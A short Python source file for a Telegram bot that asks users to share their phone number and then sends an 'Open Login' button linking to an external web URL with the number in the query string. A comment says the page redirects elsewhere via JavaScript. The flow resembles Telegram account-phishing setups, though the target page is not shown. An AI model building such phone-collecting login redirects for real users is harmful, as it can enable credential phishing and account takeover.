import os
import urllib.parse
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

WEB_URL = os.getenv("WEB_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("Share My Phone Number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    await update.message.reply_text("Share your phone number to continue.", reply_markup=reply_markup)

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact:
        await update.message.reply_text("Invalid contact.")
        return

    phone = contact.phone_number
    url = f"{WEB_URL}?phone={urllib.parse.quote(phone)}"

    # INLINE BUTTON → OPENS IN WEBVIEW → JS REDIRECTS TO EXTERNAL
    keyboard = [[InlineKeyboardButton("Open Login", url=url)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Tap to open login:", reply_markup=reply_markup)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.run_polling()

if __name__ == "__main__":
    main()
